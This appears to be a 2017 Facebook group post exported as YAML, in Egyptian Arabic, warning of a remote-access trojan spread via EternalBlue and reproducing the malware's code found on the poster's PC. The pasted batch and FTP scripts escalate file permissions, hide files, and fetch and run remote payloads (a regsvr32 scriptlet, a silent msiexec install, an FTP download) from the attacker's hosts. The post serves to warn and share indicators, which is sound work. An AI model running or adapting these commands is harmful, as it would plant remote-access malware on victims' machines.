@@ -1,0 +1,118 @@
+---
+message: "السلام عليكم ورحمة الله وبركاته\nباختصار علشان لو مش عايز تقرا التفاصيل
+  : فيه تروجان جديد الى حد ما بيستخدم نفس فكرة ال wanna cry يعني مش محتاج انك تنزل
+  برنامج مشبوه او تدوس على لينك غلط ... عندك ويندوز يبقى انت تمام كده ممكن التروجان
+  ده يجي لك ...بس مشكلته ان حتى التحديث بتاع ميكروسوفت مش كافي لتفاديه ... هو مش بيعمل
+  حاجه في الجهاز غير انه بيدي التحكم للمخترق بس... وحتى الان تقريبا مفيش حاجه بتقدر
+  تمنعه .. كل اللي بيقدروا عليه انهم يقللوا من اثاره بس \nالتفاصيل لو الموضوع ده يهمك\n\nطبعا
+  كلنا عارفين \nwannacry\n واللي عمله ... ده تحذير من تروجان خطير موجود... النهارده
+  بالصدفه اكتشفت تروجان موجود عندي على الجهاز ... طبعا انا عادة مش باحط انتي فيرس
+  باعتبار اني عارف اني مش بافتح اي حاجه غريبه والويندوز بيكون محدث لاخر تحديث بس ...
+  طبعا انا استغربت وقعدت ادور التروجان ده جالي منين وشفت الحاجات اللي بتشتغل في ال
+  \nstartup\n واتاكدت انها كلها مفيهاش مشاكل والمهم نزلت انتي فيرس \navast\nوهو لقى
+  التروجان وحذفه وكله تمام ... المشكله بقى اني بعد شويه لقيت التروجان ده ظهر تاني
+  وانا قاعد على الجهاز ... قلت يبقى اكيد فيه \nvirus downloader \nعلى الجهاز ... ولان
+  الجهاز اللي انا شغال عليه مش مهم قوي فقررت افتح كود التروجان ده وامشي وراه ... لقيته
+  بيدخل على \nftp \nوبينزل منه ملفات وسيرفر ال \nftp\n ده مفتوح عليه \nremote desktop\nفجربت
+  ادخل عليه علشان اشوف اخرته ايه ... وبعد البحث على النت لقيت انه فيرس مشهور بيشتغل
+  في هدوء :) ... مش بيعمل اي حاجه في جهازك غير انه بيدي السلطه عليه للاتاكر .. اكتشفوه
+  بالصدفه وهما بيحاولوا يحلوا مشكلة ال\nwannacry\nالكوميدي فيه بس انه لو اصاب جهازك
+  بيحميه من ال\nwannacry\nبس مشكلته ان ميكروسوفت لحد دلوقت مش عامله له حل ... يعني
+  بالرغم من اني نزلت كل التحديثات الا انه استمر يصيب الجهاز وفيه ناس كتير اجهزتها
+  اصيبت بيه ويمكن لانه شغال في هدوء محدش عارف بيه ... جربت كل حاجات ميكروسوفت وتحديث
+  ال wannacry \nواقفل ال\n SMP\nولا اي اندهاشه ... والانتي فيرس كل اللي عارف يعمله
+  انه يمنعه من التنزيل بس ...وكل ما اوقف البرنامج اللي بيحاول يعمل \ndownload\nالاقي
+  برنامج تاني... واخر حاجه لقيت ال \nsql server \nهو نفسه اللي بيعمل \ndownload \nللتروجان
+  ... ومش عارف لحد دلوقت اعمل له ايه\nالاكواد اللي لقيتها في التروجان\n@echo off\nmode
+  con: cols=13 lines=1\ncacls C:\\Progra~1\\Common~1\\System\\ado\\msado15.dll /e
+  /g system:f&cacls C:\\windows\\system32\\cacls.exe /e /g system:f&cacls C:\\windows\\system32\\cmd.exe
+  /e /g system:f&cacls C:\\windows\\system32\\ftp.exe /e /g system:f&cacls C:\\windows\\system32\\rundll32.exe
+  /e /g everyone:f\ntaskkill /f /im regsvr32.exe&taskkill /f /im rundll32.exe\nregsvr32
+  /s c:\\Progra~1\\Common~1\\System\\Ado\\Msado15.dll&regsvr32 /s jscript.dll&regsvr32
+  /s vbscript.dll&regsvr32 /s scrrun.dll&regsvr32 /s WSHom.Ocx&regsvr32 /s shell32.dll\nattrib
+  +s +h *.bat\nstart regsvr32 /u /s /i:http://js.mys2016.info:280/v.sct scrobj.dll\nstart
+  msiexec.exe /i http://js.mys2016.info:280/helloworld.msi /q\nexit\n\nده اللي بيشتغل
+  مره واحده\n\nopen down.mys2016.info\nmssql2\n1433\nget bsy.rar c:\\windows\\debug\\bss.exe\nbye\nده
+  اللي بينزل التروجان ... بيدخل بالاف تي بي بالاوامر اللي فاتت دي"
+link: https://www.cyphort.com/eternalblue-exploit-actively-used-deliver-remote-access-trojans/
+from:
+  name: Khaled Mohammad Soradi
+  id: '10155226291231186'
+type: link
+picture: https://external.xx.fbcdn.net/safe_image.php?d=AQBoDdQFtsOn8l4D&w=130&h=130&url=https%3A%2F%2Fwww.cyphort.com%2Fwp-content%2Fuploads%2F2017%2F04%2Fspyware2.jpg&cfs=1&_nc_hash=AQD3X0VvgtM1J-SG
+created_time: '2017-06-23T22:39:52+0000'
+updated_time: '2017-06-25T05:37:50+0000'
+name: EternalBlue Exploit Actively Used to Deliver Remote Access Trojans - Cyphort
+permalink_url: https://www.facebook.com/groups/egyptian.geeks/permalink/1525060397533663/
+shares:
+  count: 1
+id: '172338516139198_1525060397533663'
+reactions:
+  data:
+  - id: '1550774681686883'
+    name: Eslam Esmaeal
+    type: LIKE
+  - id: '10155378657088613'
+    name: Hossam Soffar
+    type: LIKE
+  - id: '10155441399893250'
+    name: Ahmad Mayo
+    type: LIKE
+  - id: '1615867218436818'
+    name: Ahmed Seraj Mera
+    type: LIKE
+  - id: '1963967893633058'
+    name: Mo'men Sayeed
+    type: LIKE
+  - id: '289957711528127'
+    name: Ibrahim Kotb
+    type: HAHA
+  - id: '10214343099918744'
+    name: Mahmoud Kandil
+    type: LIKE
+  - id: '10155432639833282'
+    name: Ahmed Abdo
+    type: WOW
+  - id: '1860428417314576'
+    name: Mostafa ElBarad
+    type: LIKE
+  paging:
+    cursors:
+      before: TVRBd01EQXlOak13T1RjMk5Ua3pPakUwT1Rnek1UTTBOVFU2TWpVME1EazJNVFl4TXc9PQZDZD
+      after: TVRBd01EQXdOREl6TURnek1Ua3hPakUwT1RneU5UYzJPRGs2TWpVME1EazJNVFl4TXc9PQZDZD
+comments:
+  data:
+  - created_time: '2017-06-23T23:08:06+0000'
+    from:
+      name: Mohamed Abdel Aty
+      id: '10215620557573580'
+    message: لازم تلازم تعمل share لل sample دي - لو الانتي فايرس بتاعتك فعلا مش بتكتشفها
+      - علشان الناس تبتدي تعمل block لل C&C servers
+    id: '1525075797532123'
+  - created_time: '2017-06-25T05:37:48+0000'
+    from:
+      name: Mohamed Salah
+      id: '442714802813794'
+    message: "و لهذا السبب لا استعمل غير الفايروول و اختياري هو كومودو و من حين لآخر
+      بعمل سكان ب مالويربايتس بر عتب مش اكتر و اكتر حاجة براقبها هي الكونكشينز عندي
+      و لحد الان مطمن \U0001F642"
+    id: '1526249694081400'
+  paging:
+    cursors:
+      before: WTI5dGJXVnVkRjlqZAFhKemIzSTZANVFV5TlRBM05UYzVOelV6TWpFeU16b3hORGs0TWpVNU1qZAzIZD
+      after: WTI5dGJXVnVkRjlqZAFhKemIzSTZANVFV5TmpJME9UWTVOREE0TVRRd01Eb3hORGs0TXpZANU1EWTQZD
+attachments:
+  data:
+  - description: During the WannaCry pandemic attack, Cyphort Labs discovered that
+      other threat actors have been using the same EternalBlue exploit to deliver
+      other malware. This malware is not a ransomware and is not …
+    media:
+      image:
+        height: 200
+        src: https://external.xx.fbcdn.net/safe_image.php?d=AQAkcxPyCTwLSzOU&w=720&h=720&url=https%3A%2F%2Fwww.cyphort.com%2Fwp-content%2Fuploads%2F2017%2F04%2Fspyware2.jpg&cfs=1&_nc_hash=AQAjjmuxwpmwl0qy
+        width: 200
+    target:
+      url: https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.cyphort.com%2Feternalblue-exploit-actively-used-deliver-remote-access-trojans%2F&h=ATN7GYqlXQnOuTXTNUX8x9Sim9ayisRPwV-Lod9gHMEBJoUP5lyPMuz_pqSMwkSoxrMlNUkpr5qatAJJqPolKaqyQUjR0N8L9-uF&s=1&enc=AZNVZXXMl2ivUDo5f0OgY8YhvaLWmAgi9T3dqCTOKb5U07Cliv_RGtcthKhQtkELHVildmi8uaR9wE33myqnoihf
+    title: EternalBlue Exploit Actively Used to Deliver Remote Access Trojans - Cyphort
+    type: share
+    url: https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.cyphort.com%2Feternalblue-exploit-actively-used-deliver-remote-access-trojans%2F&h=ATN7GYqlXQnOuTXTNUX8x9Sim9ayisRPwV-Lod9gHMEBJoUP5lyPMuz_pqSMwkSoxrMlNUkpr5qatAJJqPolKaqyQUjR0N8L9-uF&s=1&enc=AZNVZXXMl2ivUDo5f0OgY8YhvaLWmAgi9T3dqCTOKb5U07Cliv_RGtcthKhQtkELHVildmi8uaR9wE33myqnoihf
